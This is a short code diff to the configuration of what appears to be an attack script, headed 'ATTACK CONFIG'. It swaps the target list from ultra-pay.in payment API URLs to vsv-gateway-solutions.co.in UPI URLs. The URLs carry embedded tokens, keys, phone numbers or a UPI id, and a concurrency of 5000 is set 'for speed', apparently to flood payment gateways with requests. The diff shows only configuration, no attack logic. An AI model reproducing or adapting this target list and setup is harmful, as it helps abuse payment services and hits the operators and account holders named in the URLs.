@@ -20,8 +20,8 @@ ADMIN_ID = 8401097557
 
 # ─── ATTACK CONFIG ────────────────────────────────────────
 TARGET_APIS = [
-    "https://ultra-pay.in/APIs/api?token=03ImpEdccxeW52fJDa21P8PmeqO5JZ9ih5yOR92oDPHj&key=i8g5tb9OBczYhcAk8vgp&paytoNumber=9359202967&amount=1&comment={comment}",
-    "https://ultra-pay.in/APIs/api?token=vlJEudnxirygr2lWDdRRVzNTlovGDOhHWi1Rs8LRoA&key=buTSXj38WxEW9T70y3&paytoNumber=6283146815&amount=1&comment={comment}"
+    "https://vsv-gateway-solutions.co.in/Api/upi.php?token=CEBUPEBC&upi_id=storymx@fam&amount=1&comment={comment}",
+    "https://vsv-gateway-solutions.co.in/Api/upi.php?token=CEBUPEBC&upi_id=storymx@fam&amount=1&comment={comment}"
 ]
 
 CONCURRENT = 5000                # Adjust for speed
